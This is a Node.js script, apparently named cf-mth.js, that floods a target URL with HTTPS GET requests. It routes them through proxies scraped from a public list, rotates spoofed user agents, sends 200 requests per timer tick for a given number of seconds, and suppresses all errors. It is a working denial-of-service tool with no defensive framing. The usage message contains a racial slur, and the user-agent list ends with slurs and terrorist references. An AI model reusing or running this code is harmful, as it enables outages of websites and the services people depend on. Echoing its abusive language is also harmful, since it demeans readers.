if (process.argv.length <= 2) {

                console.log("nigga use the correct format..")

	console.log("node cf-mth.js [URL] [TIME]")

    process.exit(-1);

}



var url = require('url');

var fs = require('fs');

var https = require('https');

var request = require('request');

var zlib = require('zlib');

var HttpsProxyAgent = require('https-proxy-agent');





request.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=3000&country=all&anonymity=all&ssl=all', (err, res, set) => {

  var proxies = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);



  process.on('uncaughtException', (err) => {});

  process.on('unhandledRejection', (err) => {});



	const userAgents = [
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52 (Edition Yx 01)",
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition Campaign 34)",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition 360-1)",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.8.131 Version/11.11",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition avira)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36 OPR/27.0.1689.54 (Edition Yx)",
"Opera/9.80 (Windows NT 5.1; U; IBM EVV/3.0/EAK01AG9/LE; Edition DriverPack; ru) Presto/2.10.229 Version/11.61",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36 OPR/52.0.2871.30",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52",
"Opera/9.20 (Windows NT 6.0; U; en)",
"Opera/9.80 (Windows NT 6.1; WOW64; U; uk) Presto/2.10.289 Version/12.02",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2130.80 (Edition Yx 01)",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2130.80 (Edition Campaign 47)",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36 OPR/16.0.1196.73",
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition Yx 01)",
"Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.10",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 OPR/51.0.2830.55 (Edition Campaign 76)",
"Opera/9.80 (Windows NT 5.1; MRA 6.0 (build 6083)) Presto/2.12.388 Version/12.15",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36 OPR/35.0.2066.79",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 OPR/30.0.1835.52 (Edition Yx)",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition Rambler)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62",
"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.10.289 Version/12.02",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91 (Edition Yx 01)",
"Opera/8.49 (X11; Linux i686; en-US) Presto/2.8.232 Version/10.00",
"Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36 OPR/30.0.1835.88 (Edition Campaign 67)",
"Opera/9.80 (X11; FreeBSD 8.1-RELEASE-p1 i386; U; ru) Presto/2.6.30 Version/10.61",
"Opera/9.80 (Windows NT 6.2; Edition Yandex) Presto/2.12.388 Version/12.12",
"Opera/9.26 (Windows NT 5.1; U; de)",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36 OPR/33.0.1990.115",
"Opera/9.80 (Windows NT 6.1; Edition Yx; MRA 5.10 (build 5244)) Presto/2.12.388 Version/12.15",
"Mozilla/5.0 (Windows NT 6.1; ru; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 11.60",
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36 OPR/31.0.1889.99 (Edition Yx)",
"Mozilla/5.0 (Windows NT 5.1; ru; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 11.51",
"Opera/9.23 (Windows NT 5.0; U; fr)",
"Opera/9.80 (Windows NT 6.2; Edition Campaign 06) Presto/2.12.388 Version/12.10",
"Opera/9.80 (Macintosh; Intel Mac OS X 10_5_8; U; de) Presto/2.7.38 Version/11.00",
"Opera/9.64 (Windows NT 6.1; U; MRA 6.0 (build 6068); ru) Presto/2.1.1",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36 OPR/28.0.1750.48 (Edition Campaign 67)",
"Opera/9.80 (Windows NT 6.2; U; MRA 5.9 (build 4876); ru) Presto/2.10.229 Version/11.64",
"Opera/9.80 (Windows NT 6.0; U; BE65296F-26D4-54FB-306A-D96F9D5DECF8; ru) Presto/2.10.289 Version/12.00",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60 (Edition RMV)",
"Opera/9.80 (Windows NT 6.1; U; MRA 5.7 (build 03757); ru) Presto/2.6.30 Version/10.63",
"Opera/9.25 (Windows NT 5.1; U; nb)",
"Opera/9.80 (Windows NT 5.2; WOW64; Edition Campaign 21) Presto/2.12.388 Version/12.12",
"Opera/9.80 (Windows NT 6.0; U; MRA 8.0 (build 5999); ru) Presto/2.10.289 Version/12.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174 (Edition Campaign 34)",
"Opera/9.50 (Windows NT 5.1; U; uk)",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.00",
"Opera/9.80 (Windows NT 6.1; WOW64; MRA 6.5 (build 9316)) Presto/2.12.388 Version/12.10",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36 OPR/27.0.1689.69 (Edition Campaign 67)",
"Opera/9.80 (Windows NT 6.2; U; MRA 5.7 (build 03797); ru) Presto/2.6.30 Version/10.70",
"Opera/9.80 (Windows NT 5.1; Edition Yx 01) Presto/2.12.388 Version/12.15",
"Opera/9.80 (Windows NT 5.2; U; MRA 6.0 (build 5704); ru) Presto/2.10.289 Version/12.02",
"Opera/9.80 (Windows NT 6.2; MRA 5.10 (build 5265)) Presto/2.12.388 Version/12.10",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25",
"Opera/9.80 (Windows NT 6.1; U; MRA 6.0 (build 5680); ru) Presto/2.9.168 Version/11.51",
"Mozilla/5.0 (Windows NT 5.1; WOW64; x64) AppleWebKit/531.71.28 (KHTML, like Gecko) Chrome/56.2.6965.1693 Safari/532.10 OPR/42.0.5142.0870",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.50",
"Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.11",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36 OPR/30.0.1835.88 (Edition Yx)",
"Opera/9.80 (Windows NT 6.2; WOW64; MRA 5.10 (build 5339)) Presto/2.12.388 Version/12.18",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.1144",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 OPR/45.0.2552.635",
"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36 OPR/31.0.1889.99 (Edition Yx)",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36 OPR/28.0.1750.48",
"Opera/9.80 (Windows NT 6.2; U; ru) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.16",
"Opera/9.80 (Windows NT 6.1; WOW64; U; en) Presto/2.10.229 Version/11.64",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40",
"Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.12",
"Opera/9.80 (Windows NT 6.1; Edition Yx) Presto/2.12.388 Version/12.18",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2597.57 (Edition Yx)",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.8.4) Presto/2.12.388 Version/12.16",
"Opera/9.21 (Windows NT 5.1; U; cs)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.168 Safari/537.36 OPR/51.0.2830.40 (Edition 360-1)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2597.39",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36 OPR/40.0.2308.81",
"Opera/8.54 (Windows NT 5.1; U; ru)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 OPR/30.0.1835.59 (Edition Campaign 48)",
"Opera/9.80 (Windows NT 6.2; U; MRA 6.0 (build 5711); ru) Presto/2.10.229 Version/11.61",
"Opera/9.80 (Windows NT 6.0; MRA 6.0 (build 5676)) Presto/2.12.388 Version/12.10",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36 OPR/18.0.1284.49",
"Opera/9.80 (Windows NT 6.1; WOW64; Edition Yx 01) Presto/2.12.388 Version/12.15",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25 (Edition FCI)",
"Opera/9.80 (Windows NT 5.1; U; MRA 6.3 (build 8050); ru) Presto/2.10.289 Version/12.02",
"Opera/9.27 (Windows NT 5.2; U; MRA 6.0 (build 5711); ru)",
"Opera/9.80 (Windows NT 6.1; Edition Rambler) Presto/2.12.388 Version/12.12",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36 OPR/28.0.1750.40 (Edition FCI)",
"Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 OPR/30.0.1835.52 (Edition FCR)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.55",
"Opera/9.80 (Windows NT 5.1; WOW64; U; MRA 6.0 (build 5972); ru) Presto/2.10.289 Version/12.00",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36 OPR/30.0.1835.125",
"Opera/9.80 (Windows NT 5.1; U; MRA 5.4 (build 02614); ru) Presto/2.6.30 Version/10.63",
"Opera/9.80 (Windows NT 6.1; U; et) Presto/2.5.24 Version/10.53",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 OPR/51.0.2830.55",
"Opera/9.80 (Windows NT 5.1; MRA 6.0 (build 5998)) Presto/2.12.388 Version/12.11",
"Opera/9.27 (Windows NT 5.1; U; en)",
"Opera/9.80 (Windows NT 6.1; U; MRA 6.5 (build 9316); ru) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (Windows 98; U) Opera 7.20 [en]",
"Opera/9.80 (Windows NT 6.0; U; bg) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.2; WOW64; MRA 6.3 (build 8050)) Presto/2.12.388 Version/12.15",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.22 Safari/537.36 OPR/36.0.2072.0 (Edition developer)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67",
"Opera/9.80 (Windows NT 6.1; WOW64; MRA 8.0 (build 6019)) Presto/2.12.388 Version/12.17",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.9.168 Version/11.51",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition Yx 01)",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition Campaign 09)",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 OPR/25.0.1614.68",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36 OPR/37.0.2178.43",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36 OPR/38.0.2220.31 (Edition Yx)",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.168 Safari/537.36 OPR/51.0.2830.40",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.54",
"Opera/9.80 (Windows NT 5.1; DepositFiles/FileManager 0.9.9.206 YB/5.0.3) Presto/2.12.388 Version/12.14",
"Opera/9.80 (Windows NT 6.2; WOW64; Edition Yx) Presto/2.12.388 Version/12.17",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.58",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.54",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.87 Safari/537.36 OPR/41.0.2353.56",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.55",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36 OPR/50.0.2762.46 (Edition Campaign 34)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.29 (Edition beta)",
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67 (Edition Yx 02)",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36 OPR/32.0.1948.69 (Edition Campaign 34)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2597.57 (Edition 360-1)",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.6.30 Version/10.62",
"Opera/9.80 (Windows NT 6.2; DepositFiles/FileManager 0.9.9.206 YB/5.0.3) Presto/2.12.388 Version/12.14",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36 OPR/25.0.1614.50 (Edition Yx)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition Campaign 75)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36 OPR/37.0.2178.54",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 OPR/36.0.2130.65 (Edition Yx)",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition Yx)",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 OPR/51.0.2830.55 (Edition Yx)",
"Mozilla/5.0 (Windows NT 4.10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2130.80",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.40 (Edition Yx 01)",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.42",
"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.10.229 Version/11.60",
    "Mozilla/5.0 (X11; Linux x86_64; ru-ru) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36",

    "Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",

    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",

    "Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",

    "Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",

    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",

    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",

    "Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4",

    "Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",

    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Mobile Safari/537.36 SearchCraft/9.9.9",

    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9620; pt-BR) AppleWebKit/534.11 (KHTML, like Gecko) Version/7.1.0.1112 Mobile Safari/534.11",

    "BlackBerry9000/4.6.0.266 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/120,gzip(gfe)",  

    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",

    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",

    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",

    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",

    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",

    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",

    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",

    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",

    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",

    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",

    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",

    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",

    "Opera/9.62 (X11; Linux x86_64; sl-SI) Presto/2.11.208 Version/12.00",

     "Opera/9.54 (Windows 98; sl-SI) Presto/2.9.286 Version/11.00",

    "NULLED RUNS YOU RETARD",

    "ISIS W",

    "OSAMA BIN DADDY"

	];

    

  var options = {};

  var parsed = url.parse(process.argv[2]);

  parsed.headers = {

    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',

    'accept-encoding': 'gzip, deflate, br',

    'accept-language': 'en-US;q=0.8,en;q=0.7',

    'cache-control': 'no-cache',

    'pragma': 'no-cache',

    'upgrade-insecure-requests': 1,

    'Connection': 'keep-alive',

    'upgrade-insecure-requests': 1,

    'user-agent': '' + userAgents[Math.floor(Math.random() * userAgents.length)] + ''

  }



  setTimeout(function() {

    process.exit(1);

  }, process.argv[3] * 1000);



  setInterval(function() {

	 

	 for (var i = 0; i < 200; i++) {

    var options = parsed;

	 

    options.agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);

	

    https.get(options, function(res) {

      console.log(res.statusCode);

    });

	 

    }

  });

});

